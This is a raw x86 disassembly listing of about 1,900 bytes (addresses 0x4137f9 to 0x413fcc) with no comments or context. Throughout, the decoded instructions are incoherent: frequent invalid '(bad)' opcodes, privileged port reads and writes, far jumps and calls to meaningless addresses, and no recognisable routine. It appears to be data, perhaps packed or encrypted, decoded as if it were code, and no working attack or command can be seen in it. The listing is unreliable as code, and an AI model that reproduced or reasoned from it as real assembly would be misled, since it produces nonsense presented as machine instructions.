  4137f9:	xor    BYTE PTR [edi-0x45d5a173],al
  4137ff:	mov    bh,0x82
  413801:	and    BYTE PTR [ebx],ah
  413803:	dec    edx
  413804:	cmp    eax,0xd603e9c8
  413809:	xchg   ebx,eax
  41380a:	test   al,0x73
  41380c:	test   BYTE PTR [ebx+0x71],dh
  41380f:	adc    al,0xee
  413811:	repz jns 0x3ab4d7b3
  413818:	fwait
  413819:	dec    edi
  41381a:	dec    ecx
  41381b:	mov    dh,0xdd
  41381d:	clc    
  41381e:	int3   
  41381f:	addr16 and edi,edx
  413822:	fdivr  st,st(1)
  413824:	jmp    0x100515aa
  413829:	js     0x413874
  41382b:	frstor [ebp-0x70]
  41382e:	or     DWORD PTR [ebp-0x77a38de9],edi
  413834:	pop    esi
  413835:	shr    ecx,cl
  413837:	sub    bh,BYTE PTR [ebx+0x4a]
  41383a:	sbb    BYTE PTR [edx-0x45c08420],0x46
  413841:	retf   0xe866
  413844:	cmp    ebx,DWORD PTR [esi-0x5f2dcd3e]
  41384a:	cmp    al,ch
  41384c:	sbb    eax,ebx
  41384e:	(bad)  
  41384f:	pop    edi
  413850:	dec    esp
  413851:	retf   0x104b
  413854:	je     0x413887
  413856:	sbb    ch,BYTE PTR [eax+ecx*1+0x68]
  41385a:	retf   
  41385b:	lahf   
  41385c:	repz jl 0x413884
  41385f:	scas   eax,DWORD PTR es:[edi]
  413860:	adc    bl,BYTE PTR fs:[ecx-0x67]
  413864:	repnz rcr al,1
  413867:	xor    DWORD PTR [edi-0xcd91081],edx
  41386d:	(bad)  
  41386e:	sub    esi,eax
  413870:	jno    0x413809
  413872:	mov    eax,ds:0x50c0f9c4
  413877:	retf   
  413878:	cs scas al,BYTE PTR es:[edi]
  41387a:	inc    ecx
  41387b:	shl    DWORD PTR [edi-0x2c7bae45],0x68
  413882:	jbe    0x4138ee
  413884:	pop    ebx
  413885:	mov    edi,esp
  413887:	ja     0x4138ec
  413889:	(bad)  
  41388a:	or     ebx,DWORD PTR [esp+edi*4-0xd]
  41388e:	pop    es
  41388f:	jge    0x4138ae
  413891:	bound  edx,QWORD PTR [ebx+eiz*4+0x5c0f868d]
  413898:	cmp    dl,BYTE PTR [edi+0x37bee335]
  41389e:	fistp  QWORD PTR [eax]
  4138a0:	pop    edx
  4138a1:	aas    
  4138a2:	das    
  4138a3:	sbb    eax,0x68cf1769
  4138a8:	cdq    
  4138a9:	retf   
  4138aa:	inc    ebx
  4138ab:	jae    0x413830
  4138ad:	fldenv [esp+esi*2-0x25]
  4138b1:	sub    DWORD PTR [edx+0x2a],ebx
  4138b4:	in     al,dx
  4138b5:	add    esp,DWORD PTR [ebp-0x71]
  4138b8:	inc    ebx
  4138b9:	push   ds
  4138ba:	test   eax,0xe6da865c
  4138bf:	aad    0x5f
  4138c1:	repnz mov edx,0x3f6fa472
  4138c7:	cmp    eax,0xd51a7b7
  4138cc:	shl    BYTE PTR [edi+0x10],1
  4138cf:	cs and cl,bl
  4138d2:	jg     0x41394d
  4138d4:	imul   esi,edx,0x55
  4138d7:	loope  0x413869
  4138d9:	mov    dl,0xbb
  4138db:	test   BYTE PTR ds:0x7cba99b2,al
  4138e1:	int3   
  4138e2:	imul   ebp,DWORD PTR ds:0xe1e42e3e,0x63
  4138e9:	inc    esi
  4138ea:	cmp    eax,0xbd3ee024
  4138ef:	jns    0x4138a9
  4138f1:	or     al,0xae
  4138f3:	or     DWORD PTR [eax+ebx*1-0x245d999d],0xffffffb7
  4138fb:	xchg   esp,eax
  4138fc:	mov    esi,0xb4fb2ce9
  413901:	jge    0x41391a
  413903:	cld    
  413904:	cmp    BYTE PTR [edi+0x1a],0x44
  413908:	jp     0x413902
  41390a:	xchg   ecx,eax
  41390b:	cmp    edx,DWORD PTR [edx]
  41390d:	add    bh,BYTE PTR [edx-0x621d8bc3]
  413913:	mov    ch,0x54
  413915:	xor    DWORD PTR [eax+0x3c0bd0d2],0x79
  41391c:	push   ecx
  41391d:	out    dx,al
  41391e:	xchg   edx,eax
  41391f:	xor    ecx,ecx
  413921:	xchg   ebp,eax
  413922:	sbb    ebp,DWORD PTR [edi]
  413924:	dec    edi
  413925:	mov    dh,0xbd
  413927:	(bad)  
  413928:	sar    BYTE PTR [ebx-0x5b6fc44e],1
  41392e:	xchg   ecx,eax
  41392f:	ret    0x6c98
  413932:	push   ds
  413933:	sub    al,0xd8
  413935:	xchg   esi,eax
  413936:	pusha  
  413937:	clc    
  413938:	aaa    
  413939:	sbb    eax,0xee1317c7
  41393e:	ss int3 
  413940:	test   BYTE PTR [esp+ecx*8-0x2a],ah
  413944:	dec    eax
  413945:	mov    BYTE PTR [ebp+0x976945],0x76
  41394c:	(bad)  
  41394d:	jge    0x4138fe
  41394f:	in     al,0xf2
  413951:	(bad)  
  413952:	in     eax,0xbd
  413954:	fstp   QWORD PTR [esi-0xe5f9275]
  41395a:	sbb    eax,DWORD PTR [edx+0x73467772]
  413960:	cmp    BYTE PTR [esp+ebx*8+0xc],cl
  413964:	mov    esi,0x1dcba67a
  413969:	cmp    eax,0x5f56a85a
  41396e:	mov    ch,0xba
  413970:	mov    ch,0x1c
  413972:	push   esp
  413973:	and    al,bh
  413975:	jge    0x4139a8
  413977:	push   ebp
  413978:	mov    dl,0xe5
  41397a:	mov    ch,0x3
  41397c:	pop    ebp
  41397d:	dec    eax
  41397e:	popa   
  41397f:	ins    DWORD PTR es:[edi],dx
  413980:	imul   BYTE PTR [eax]
  413982:	idiv   BYTE PTR ss:[ebx-0x6948edf2]
  413989:	call   0x9cd:0x7af8b53f
  413990:	push   ebp
  413991:	fsubr  st,st(0)
  413993:	out    0xad,al
  413995:	cmp    BYTE PTR [eax+ebx*1+0x7],bh
  413999:	arpl   WORD PTR [ecx],bx
  41399b:	retf   0x1df7
  41399e:	inc    esp
  41399f:	fs fs pop ebp
  4139a2:	daa    
  4139a3:	lahf   
  4139a4:	mov    cl,0x30
  4139a6:	mov    ds,WORD PTR [edi-0x65]
  4139a9:	das    
  4139aa:	cmp    eax,0xc2bac594
  4139af:	mov    bh,0xae
  4139b1:	fdivr  st,st(7)
  4139b3:	sub    al,0xcc
  4139b5:	out    dx,eax
  4139b6:	mov    al,ds:0xa49c1008
  4139bb:	shr    BYTE PTR [edx+ebx*4-0x149e6690],1
  4139c2:	jbe    0x413968
  4139c4:	push   esp
  4139c5:	mov    edi,0x61bd2e61
  4139ca:	xor    esi,DWORD PTR ds:0x99a364bc
  4139d0:	xchg   BYTE PTR [eax],al
  4139d2:	daa    
  4139d3:	pusha  
  4139d4:	sbb    bh,al
  4139d6:	icebp  
  4139d7:	out    0x56,al
  4139d9:	mov    WORD PTR [ebx],es
  4139db:	and    DWORD PTR [ebx+0x1a],0xffffffa6
  4139df:	jecxz  0x4139a9
  4139e1:	mov    ds,ecx
  4139e3:	jl     0x4139d0
  4139e5:	jmp    0xa84b9dd4
  4139ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139eb:	(bad)  
  4139ed:	xor    al,0x10
  4139ef:	mov    eax,0x30cf1fb
  4139f4:	adc    ecx,DWORD PTR [ebx]
  4139f6:	fld    TBYTE PTR [eax+0x70cb37b3]
  4139fc:	add    al,0x80
  4139fe:	mov    dl,0x2d
  413a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a01:	jp     0x413a10
  413a03:	jge    0x413a56
  413a05:	mov    dl,0xea
  413a07:	pop    esp
  413a08:	repz mov al,ds:0x316991f
  413a0e:	mov    dl,0x38
  413a10:	pop    ss
  413a11:	mov    eax,ds:0x6b9933ca
  413a16:	icebp  
  413a17:	push   ebx
  413a18:	jmp    0xaf38:0x4f6a8a54
  413a1f:	mov    DWORD PTR [edx],esp
  413a21:	aam    0x78
  413a23:	(bad)  
  413a25:	xchg   ebp,eax
  413a26:	je     0x413a60
  413a28:	push   es
  413a29:	test   BYTE PTR [ebx+0x64],dl
  413a2c:	add    eax,0xca6b27cf
  413a31:	sbb    esp,DWORD PTR [ecx+0x66]
  413a34:	scas   al,BYTE PTR es:[edi]
  413a35:	dec    eax
  413a36:	dec    eax
  413a37:	rcr    BYTE PTR [ebp+0x3a14d5ad],1
  413a3d:	js     0x4139fa
  413a3f:	popa   
  413a40:	mov    ebx,0x44656d4f
  413a45:	and    BYTE PTR [edi],bh
  413a47:	add    al,BYTE PTR [edx+0x32459c83]
  413a4d:	xchg   ebp,eax
  413a4e:	ins    DWORD PTR es:[edi],dx
  413a4f:	test   eax,0xf7a3d54e
  413a55:	or     ebx,DWORD PTR [ebx]
  413a57:	fstp   QWORD PTR [edx]
  413a59:	xor    ch,BYTE PTR [eax-0x30]
  413a5c:	xor    edx,DWORD PTR [eax-0x4d]
  413a5f:	adc    DWORD PTR [edi-0x78],0x54d6a290
  413a66:	daa    
  413a67:	adc    esi,DWORD PTR [edx]
  413a69:	mov    DWORD PTR [edi+0x8],esi
  413a6c:	xor    eax,DWORD PTR [edi-0x467d369c]
  413a72:	ror    DWORD PTR [esp+ebp*8+0x5d],cl
  413a76:	mov    eax,0x5795304e
  413a7b:	sbb    BYTE PTR [ebx+ebp*4-0x6d],dl
  413a7f:	cs jne 0x413a23
  413a82:	sti    
  413a83:	lods   al,BYTE PTR ds:[esi]
  413a84:	mov    ds,eax
  413a86:	jae    0x413a95
  413a88:	out    0x30,al
  413a8a:	int    0xd8
  413a8c:	jmp    0x175db9c
  413a91:	pop    ss
  413a92:	mov    bh,0xd4
  413a94:	cmp    al,0x9d
  413a96:	push   ebp
  413a97:	jecxz  0x413a39
  413a99:	jns    0x413a50
  413a9b:	sahf   
  413a9c:	xchg   DWORD PTR [eax+0x45],ebx
  413a9f:	pop    esi
  413aa0:	sub    dl,BYTE PTR [ebx]
  413aa2:	cmp    DWORD PTR [ebx],eax
  413aa4:	mov    ebx,0xeb628538
  413aa9:	into   
  413aaa:	in     eax,0xd2
  413aac:	sub    al,0x2c
  413aae:	pop    ds
  413aaf:	xchg   ebx,eax
  413ab0:	push   edi
  413ab1:	push   ss
  413ab2:	dec    ecx
  413ab3:	jne    0x413ad3
  413ab5:	les    esp,FWORD PTR [eax+0x70]
  413ab8:	mov    bh,0xdb
  413aba:	(bad)  
  413abb:	cmp    DWORD PTR [esi],ecx
  413abd:	into   
  413abe:	and    eax,esp
  413ac0:	sar    ebx,1
  413ac2:	ins    BYTE PTR es:[edi],dx
  413ac3:	inc    edx
  413ac4:	and    edx,DWORD PTR [edx-0x3cb5413d]
  413aca:	or     eax,0x99e165f7
  413acf:	icebp  
  413ad0:	push   ebx
  413ad1:	mov    al,0xb9
  413ad3:	shl    esi,cl
  413ad5:	cmc    
  413ad6:	dec    ecx
  413ad7:	mov    ebx,0x401971b9
  413adc:	mov    esp,0x675946d6
  413ae1:	adc    eax,0x409f2f0a
  413ae6:	jnp    0x413add
  413ae8:	dec    esi
  413ae9:	adc    DWORD PTR [eax],ecx
  413aeb:	ins    BYTE PTR es:[edi],dx
  413aec:	jo     0x413af0
  413aee:	jno    0x413ac4
  413af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413af1:	mov    ds:0xbbdde38f,eax
  413af6:	dec    eax
  413af7:	xchg   edi,eax
  413af8:	lds    eax,FWORD PTR [esi]
  413afa:	push   ecx
  413afb:	dec    esi
  413afc:	fdivr  st,st(7)
  413afe:	ror    DWORD PTR [bx],1
  413b01:	inc    ecx
  413b02:	test   eax,0xfb8134d0
  413b07:	cmp    al,0x75
  413b09:	dec    edx
  413b0a:	ficomp WORD PTR [ecx-0x1680d995]
  413b10:	push   eax
  413b11:	pushf  
  413b12:	jl     0x413ac7
  413b14:	mov    ecx,0x32d5adbb
  413b19:	aas    
  413b1a:	and    al,0x43
  413b1c:	(bad)  [edi-0x579861a1]
  413b22:	pop    edx
  413b23:	aad    0x98
  413b25:	ret    0x11c
  413b28:	in     eax,dx
  413b29:	pushf  
  413b2a:	xor    BYTE PTR [ebp+0x2c],dl
  413b2d:	sbb    DWORD PTR [ebp+0x48076e53],ebp
  413b33:	pop    ebp
  413b34:	mov    ecx,0x80526dd3
  413b39:	ret    
  413b3a:	leave  
  413b3b:	jne    0x413abe
  413b3d:	pop    esp
  413b3e:	pop    ss
  413b3f:	push   cs
  413b40:	imul   DWORD PTR [esi-0x555f45b5]
  413b46:	(bad)  
  413b47:	frstor [edx-0x5c]
  413b4a:	jo     0x413b43
  413b4c:	sbb    DWORD PTR [edi+edi*1-0x76],ecx
  413b50:	cwde   
  413b51:	sbb    al,0x13
  413b53:	je     0x413b49
  413b55:	jno    0x413b4a
  413b57:	mov    eax,ds:0xbd643f1a
  413b5c:	loope  0x413b24
  413b5e:	sahf   
  413b5f:	shl    BYTE PTR ds:0xafa80c19,cl
  413b65:	dec    ecx
  413b66:	scas   al,BYTE PTR es:[edi]
  413b67:	call   0x7a16:0x80a6f778
  413b6e:	not    dh
  413b70:	mov    es:0xaca0532,al
  413b76:	in     al,dx
  413b77:	rcr    DWORD PTR [eax+eiz*8],0x70
  413b7b:	add    BYTE PTR [edx],ch
  413b7d:	ss cmc 
  413b7f:	jge    0x413bdd
  413b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b82:	loop   0x413b5f
  413b84:	mov    DWORD PTR [esi-0x63],eax
  413b87:	adc    bh,BYTE PTR [eax-0x61]
  413b8a:	lock (bad) 
  413b8c:	cmp    dl,BYTE PTR [eax-0xc]
  413b8f:	addr16 push 0x4a
  413b92:	lds    eax,FWORD PTR [edi]
  413b94:	add    al,0xde
  413b96:	scas   eax,DWORD PTR es:[edi]
  413b97:	jne    0x413b39
  413b99:	xchg   edx,eax
  413b9a:	loope  0x413b28
  413b9c:	push   ebx
  413b9d:	int3   
  413b9e:	cdq    
  413b9f:	test   eax,0x7820e70e
  413ba4:	sar    DWORD PTR [eax],cl
  413ba6:	(bad)
  413baa:	ror    bh,cl
  413bac:	jge    0x413b7c
  413bae:	mov    ecx,0x2067c5c4
  413bb3:	push   ebx
  413bb4:	ss out dx,eax
  413bb6:	jg     0x413be7
  413bb8:	pop    esp
  413bb9:	push   ebp
  413bba:	mov    edx,0x4b9aa344
  413bbf:	js     0x413c09
  413bc1:	and    al,BYTE PTR [ecx-0x14a8eef0]
  413bc7:	push   edx
  413bc8:	nop
  413bc9:	pop    ecx
  413bca:	lds    edx,FWORD PTR [ebx*2+0x6bf7b55e]
  413bd1:	into   
  413bd2:	addr16 inc eax
  413bd4:	outs   dx,DWORD PTR ds:[esi]
  413bd5:	and    DWORD PTR [ecx],ebx
  413bd7:	xchg   edi,eax
  413bd8:	push   esi
  413bd9:	mov    ss,WORD PTR [ecx]
  413bdb:	iret   
  413bdc:	push   esi
  413bdd:	sbb    eax,0xa97544c5
  413be2:	sub    al,0xb1
  413be4:	cmp    ch,cl
  413be6:	fnclex 
  413be8:	mov    esp,edi
  413bea:	arpl   bp,ax
  413bec:	fwait
  413bed:	(bad)  
  413bee:	pop    edx
  413bef:	pop    ecx
  413bf0:	(bad)  
  413bf1:	jge    0x413bf5
  413bf3:	add    cl,BYTE PTR [edx]
  413bf5:	inc    eax
  413bf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bf7:	std    
  413bf8:	sbb    cl,al
  413bfa:	cwde   
  413bfb:	ret    
  413bfc:	(bad)  
  413bfd:	mov    al,0x71
  413bff:	les    esp,FWORD PTR [edi]
  413c01:	adc    DWORD PTR [edi],ecx
  413c03:	or     DWORD PTR [eax-0x6],esi
  413c06:	and    BYTE PTR [esi+0x64],dh
  413c09:	push   es
  413c0a:	loop   0x413c13
  413c0c:	jp     0x413c30
  413c0e:	mov    eax,ds:0xdadb509a
  413c13:	hlt    
  413c14:	stos   BYTE PTR es:[edi],al
  413c15:	jl     0x413be3
  413c17:	xchg   ecx,eax
  413c18:	test   al,0xdc
  413c1a:	adc    DWORD PTR [edx+0x3e],eax
  413c1d:	mov    al,0xa4
  413c1f:	inc    ecx
  413c20:	sub    DWORD PTR [eax],eax
  413c22:	xchg   ecx,edi
  413c24:	jp     0x413bde
  413c26:	lea    edx,[edi]
  413c28:	adc    ebp,esp
  413c2a:	ret    0xffab
  413c2d:	es ss mov edi,ecx
  413c31:	(bad)  
  413c32:	clc    
  413c33:	ins    DWORD PTR es:[edi],dx
  413c34:	aas    
  413c35:	fistp  DWORD PTR [ebp+0x4f2f8fff]
  413c3b:	neg    BYTE PTR [edi+eiz*2]
  413c3e:	cmp    BYTE PTR [eax],0xc1
  413c41:	sub    al,0x1
  413c43:	in     al,0x80
  413c45:	ret    0x5d95
  413c48:	adc    dl,BYTE PTR [ebx]
  413c4a:	sub    al,0x44
  413c4c:	pop    edi
  413c4d:	push   ebp
  413c4e:	inc    ebx
  413c4f:	lea    edi,[ebx+0x2775681e]
  413c55:	pop    es
  413c56:	out    0x58,al
  413c58:	in     al,0x10
  413c5a:	out    dx,al
  413c5b:	sub    eax,0xc21c98e8
  413c60:	cwde   
  413c61:	cmp    eax,0xf8bb54fc
  413c66:	inc    ebp
  413c67:	xchg   ebx,eax
  413c68:	fmulp  st(1),st
  413c6a:	bound  edx,QWORD PTR [edx]
  413c6c:	daa    
  413c6d:	dec    ebx
  413c6e:	xchg   edx,eax
  413c6f:	or     eax,0x19272f03
  413c74:	jecxz  0x413cb6
  413c76:	or     al,0xa2
  413c78:	in     al,dx
  413c79:	xchg   BYTE PTR [ebp-0x3b],dh
  413c7c:	cli    
  413c7d:	mov    esp,0xacadfa74
  413c82:	inc    ebx
  413c83:	jecxz  0x413c7f
  413c85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c86:	xchg   esi,eax
  413c87:	cmp    al,0xf7
  413c89:	icebp  
  413c8a:	les    edx,FWORD PTR [eax+0x8]
  413c8d:	ficomp DWORD PTR [edx-0x775fbd29]
  413c93:	xor    eax,0x636b35e3
  413c98:	pop    ebx
  413c99:	sbb    eax,0xe6a33aaa
  413c9e:	mov    ebx,0x70e8b897
  413ca3:	mov    dh,0x8c
  413ca5:	data16 mov al,0xdc
  413ca8:	push   ebx
  413ca9:	call   FWORD PTR [esi+0x70]
  413cac:	mov    al,ds:0x7e7aa079
  413cb1:	sub    esp,esi
  413cb3:	gs mov ebp,esp
  413cb6:	mov    edx,edi
  413cb8:	sub    eax,ebp
  413cba:	rcr    al,0x23
  413cbd:	ret    
  413cbe:	push   0x42
  413cc0:	popa   
  413cc1:	fild   WORD PTR [ebx]
  413cc3:	push   esp
  413cc4:	xchg   ebp,eax
  413cc5:	(bad)
  413cc9:	into   
  413cca:	xor    al,0xa5
  413ccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ccd:	jmp    0x413cc6
  413ccf:	loop   0x413c68
  413cd1:	adc    ch,0x83
  413cd4:	sti    
  413cd5:	mov    bl,0x42
  413cd7:	mov    ebx,0x7e3011ce
  413cdc:	mov    esp,0x61da7df0
  413ce1:	(bad)
  413ce4:	xchg   ecx,eax
  413ce5:	ret    
  413ce6:	scas   al,BYTE PTR es:[edi]
  413ce7:	repnz xchg ebp,eax
  413ce9:	iret   
  413cea:	push   esp
  413ceb:	push   edi
  413cec:	or     eax,0x151b8470
  413cf1:	(bad)
  413cf5:	xchg   edi,edx
  413cf7:	xor    eax,0xd6763789
  413cfc:	pop    esp
  413cfd:	inc    ebp
  413cfe:	(bad)  
  413cff:	xlat   BYTE PTR ds:[ebx]
  413d00:	aas    
  413d01:	mov    ecx,0xecee3560
  413d06:	pop    ebx
  413d07:	pop    es
  413d08:	fs mov edx,0xefe98cef
  413d0e:	add    bl,al
  413d10:	or     al,0x19
  413d12:	leave  
  413d13:	rol    BYTE PTR [edi],cl
  413d15:	cmp    ah,BYTE PTR [edi-0x5]
  413d18:	add    dl,al
  413d1a:	vorps  xmm1,xmm2,xmm5
  413d1e:	push   cs
  413d1f:	jb     0x413d67
  413d21:	mov    al,BYTE PTR [ebx-0x6f80f31]
  413d27:	clc    
  413d28:	xor    BYTE PTR [eax+eax*4+0x408eba99],al
  413d2f:	push   ds
  413d30:	mov    esp,0x82c160dd
  413d35:	mov    eax,ds:0x948b7d1f
  413d3a:	add    dl,BYTE PTR [edx+0x45dc9aa9]
  413d40:	imul   ecx,DWORD PTR [ecx],0xffffffb5
  413d43:	mov    ecx,0xf9a63f37
  413d48:	push   esi
  413d49:	inc    ebp
  413d4a:	pop    eax
  413d4b:	das    
  413d4c:	es es gs loope 0x413d80
  413d51:	outs   dx,BYTE PTR ds:[esi]
  413d52:	(bad)
  413d55:	stos   DWORD PTR es:[edi],eax
  413d56:	cs cli 
  413d58:	xchg   esi,eax
  413d59:	rol    DWORD PTR [edi+0x1],0x44
  413d5d:	retf   0x4194
  413d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d61:	sbb    eax,0x771b759a
  413d66:	add    DWORD PTR [ecx],edi
  413d68:	push   esp
  413d69:	dec    ecx
  413d6a:	jge    0x413d46
  413d6c:	xchg   edx,eax
  413d6d:	and    BYTE PTR [edi],dl
  413d6f:	call   0x3030:0xdcee5ae7
  413d76:	in     eax,0xf
  413d78:	shl    DWORD PTR [ebx],0x66
  413d7b:	ficom  DWORD PTR [ebp-0x57e85c9c]
  413d81:	scas   al,BYTE PTR es:[edi]
  413d82:	pop    edi
  413d83:	dec    edi
  413d84:	push   0xffffffd2
  413d86:	xor    al,0x68
  413d88:	ss fwait
  413d8a:	int3   
  413d8b:	jnp    0x413d51
  413d8d:	sbb    bh,dl
  413d8f:	les    edi,FWORD PTR [ecx]
  413d91:	pop    esi
  413d92:	push   ecx
  413d93:	inc    esi
  413d94:	adc    edx,DWORD PTR [esi+edi*4+0x3b]
  413d98:	pusha  
  413d99:	xchg   DWORD PTR [edi+0x3e839e75],ebp
  413d9f:	adc    ecx,DWORD PTR [edi-0x75219cd2]
  413da5:	bound  edx,QWORD PTR [ebx+0x75]
  413da8:	sbb    eax,0x1362ae75
  413dad:	fs push ebp
  413daf:	dec    edx
  413db0:	outs   dx,BYTE PTR ds:[esi]
  413db1:	cmp    ecx,esp
  413db3:	popf   
  413db4:	(bad)  
  413db6:	add    DWORD PTR [ebp+ebp*2+0x30973e36],0x61
  413dbe:	push   ebx
  413dbf:	jno    0x413e06
  413dc1:	je     0x413db8
  413dc3:	(bad)  
  413dc4:	mov    al,0xb8
  413dc6:	int    0x1a
  413dc8:	jge    0x413db8
  413dca:	mov    WORD PTR [edi],cs
  413dcc:	daa    
  413dcd:	outs   dx,DWORD PTR ds:[esi]
  413dce:	or     BYTE PTR [ecx-0x3],bl
  413dd1:	cli    
  413dd2:	pop    ecx
  413dd3:	ja     0x413e34
  413dd5:	stc    
  413dd6:	es test ecx,ebp
  413dd9:	push   esi
  413dda:	test   eax,0x807e1ab4
  413ddf:	jnp    0x413dbd
  413de1:	imul   edx,DWORD PTR [edi-0x6f],0xc
  413de5:	mov    ecx,0xaa4793dc
  413dea:	add    al,0x78
  413dec:	pop    esp
  413ded:	push   es
  413dee:	dec    eax
  413def:	pop    edx
  413df0:	push   edx
  413df1:	arpl   ax,si
  413df3:	xchg   edi,eax
  413df4:	mov    BYTE PTR [esi-0x7f06fee6],dh
  413dfa:	cmp    eax,0x886be619
  413dff:	inc    edi
  413e00:	popa   
  413e01:	pop    es
  413e02:	push   es
  413e03:	push   esp
  413e04:	sar    BYTE PTR [edx+0x56],1
  413e07:	repz xor ebp,DWORD PTR [ecx-0x97f6d11]
  413e0e:	cwde   
  413e0f:	mov    eax,ds:0xe11ce7af
  413e14:	div    ah
  413e16:	sar    BYTE PTR ds:0xcc33b084,0x1a
  413e1d:	add    BYTE PTR [edi+0xd],al
  413e20:	mov    edx,0xa5e14519
  413e25:	hlt    
  413e26:	pop    ecx
  413e27:	cmc    
  413e28:	je     0x413db4
  413e2a:	(bad)
  413e2f:	pop    ds
  413e30:	mov    al,ds:0xde36573d
  413e35:	ret    0x6dda
  413e38:	mov    ds:0x901c6791,al
  413e3d:	mov    ah,0x9c
  413e3f:	(bad)  [ebx]
  413e41:	frstor [ecx]
  413e43:	push   esp
  413e44:	mov    eax,ds:0x809edc40
  413e49:	add    BYTE PTR [edi],ch
  413e4b:	stos   BYTE PTR es:[edi],al
  413e4c:	mul    BYTE PTR [edx+eax*2+0x64]
  413e50:	shl    BYTE PTR [esp+edx*4],0x41
  413e54:	ret    
  413e55:	repz xor eax,0x2fcfef18
  413e5b:	jmp    0xe901:0x342b73aa
  413e62:	nop
  413e63:	jns    0x413e91
  413e65:	sub    bh,cl
  413e67:	inc    edi
  413e68:	popf   
  413e69:	inc    esi
  413e6a:	sub    cl,BYTE PTR [ebp+0x11af967b]
  413e70:	ins    DWORD PTR es:[edi],dx
  413e71:	xor    eax,0x63e21547
  413e76:	(bad)  
  413e77:	sti    
  413e78:	jle    0x413e57
  413e7a:	daa    
  413e7b:	cmp    eax,0x8fd8cc9a
  413e80:	jmp    0xf17e5741
  413e85:	les    eax,FWORD PTR [ebx-0x7d968ea6]
  413e8b:	lea    edi,[ebp-0x313df3f6]
  413e91:	jp     0x413e56
  413e93:	push   esi
  413e94:	call   0x8d176d4a
  413e99:	outs   dx,DWORD PTR ds:[esi]
  413e9a:	das    
  413e9b:	dec    ecx
  413e9c:	imul   edx,ebp,0xabe6320f
  413ea2:	dec    DWORD PTR [edx]
  413ea4:	fadd   QWORD PTR [ebx-0x6326ba7d]
  413eaa:	xchg   edx,eax
  413eab:	int3   
  413eac:	lea    eax,[esi]
  413eae:	add    eax,0xf623b502
  413eb3:	sbb    al,0x50
  413eb5:	gs cmc 
  413eb7:	in     al,0x12
  413eb9:	mov    ebp,0xebc7e5d3
  413ebe:	je     0x413ebd
  413ec0:	and    eax,0x76026b59
  413ec5:	ret    
  413ec6:	adc    eax,0x8b8c1fd0
  413ecb:	in     eax,dx
  413ecc:	and    ecx,DWORD PTR [ebx-0x64c04a58]
  413ed2:	jecxz  0x413e57
  413ed4:	ds inc eax
  413ed6:	repnz test DWORD PTR [ebx-0x47],edi
  413eda:	call   0xabb899cd
  413edf:	out    dx,eax
  413ee0:	sbb    eax,0xe57b31c4
  413ee5:	push   esi
  413ee6:	cmc    
  413ee7:	xor    esp,DWORD PTR [ecx+0x3fa0ef8b]
  413eed:	dec    edi
  413eee:	(bad)  
  413eef:	jge    0x413f61
  413ef1:	fsub   DWORD PTR [edx+0x6110b540]
  413ef7:	test   DWORD PTR [esi],ebp
  413ef9:	push   edi
  413efa:	jae    0x413efc
  413efc:	scas   al,BYTE PTR es:[edi]
  413efd:	sbb    ch,BYTE PTR ds:0x30281c3b
  413f03:	pop    esi
  413f04:	push   ebx
  413f05:	gs push eax
  413f07:	ins    BYTE PTR es:[edi],dx
  413f08:	bound  ecx,QWORD PTR [edi+0x6355569f]
  413f0e:	sub    ah,BYTE PTR [esi+0x66]
  413f11:	int    0x0
  413f13:	ss das 
  413f15:	xor    eax,0x18e2e15a
  413f1a:	std    
  413f1b:	lods   al,BYTE PTR ds:[esi]
  413f1c:	out    0xdc,eax
  413f1e:	into   
  413f1f:	cmp    esp,ebp
  413f21:	jmp    0x413f95
  413f23:	fdiv   QWORD PTR [esi+0xe883045]
  413f29:	adc    ecx,DWORD PTR [esi+0x4423fe12]
  413f2f:	nop
  413f30:	in     al,dx
  413f31:	push   eax
  413f32:	out    0x6a,eax
  413f34:	sti    
  413f35:	jae    0x413f1a
  413f37:	mov    cs,ecx
  413f39:	std    
  413f3a:	outs   dx,DWORD PTR ds:[esi]
  413f3b:	adc    bl,al
  413f3d:	jge    0x413f24
  413f3f:	and    dl,BYTE PTR [edx-0xbe4f217]
  413f45:	loopne 0x413f40
  413f47:	aad    0xcd
  413f49:	xchg   edx,eax
  413f4a:	dec    edx
  413f4b:	cmp    edi,ecx
  413f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f4e:	dec    esi
  413f4f:	(bad)  [eax-0x64]
  413f52:	sbb    bh,BYTE PTR [ecx+0x2f]
  413f55:	std    
  413f56:	aam    0xcc
  413f58:	aam    0x25
  413f5a:	addr16 and ecx,ebx
  413f5d:	sbb    DWORD PTR [ebx],ebx
  413f5f:	pushf  
  413f60:	sbb    al,BYTE PTR [ebx-0x77]
  413f63:	mov    ecx,0x97750d3a
  413f68:	jnp    0x413f97
  413f6a:	pop    eax
  413f6b:	jmp    FWORD PTR [eax+0x59]
  413f6e:	les    eax,FWORD PTR [ebx]
  413f70:	nop
  413f71:	and    BYTE PTR [eax-0x42],cl
  413f74:	(bad)
  413f77:	add    DWORD PTR [edi+0x5b],esi
  413f7a:	pop    edx
  413f7b:	bound  ecx,QWORD PTR [edi-0x58580632]
  413f81:	out    dx,eax
  413f82:	outs   dx,DWORD PTR ds:[esi]
  413f83:	or     al,dl
  413f85:	lea    ecx,[edi+0x4ab8c910]
  413f8b:	pop    esi
  413f8c:	es add eax,0xffffffdc
  413f90:	cld    
  413f91:	push   eax
  413f92:	and    ah,BYTE PTR [ecx+edx*4]
  413f95:	data16 clc 
  413f97:	call   0xf2f3:0x297fb29c
  413f9e:	push   eax
  413f9f:	xor    esp,edi
  413fa1:	out    0xbf,eax
  413fa3:	sub    edx,esp
  413fa5:	mov    ebx,0x328caa01
  413faa:	pop    esp
  413fab:	push   esp
  413fac:	cld    
  413fad:	lds    edi,FWORD PTR [ebp-0x64]
  413fb0:	je     0x413f4b
  413fb2:	add    DWORD PTR [ebp+0x5b6466f6],esi
  413fb8:	pop    esi
  413fb9:	pushf  
  413fba:	adc    BYTE PTR [eax+ecx*1-0x26c249af],dh
  413fc1:	ja     0x413ffa
  413fc3:	dec    ebp
  413fc4:	and    al,0x4b
  413fc6:	and    eax,0xa4204b
  413fcb:	(bad)  
  413fcc:	sub    ecx,edx
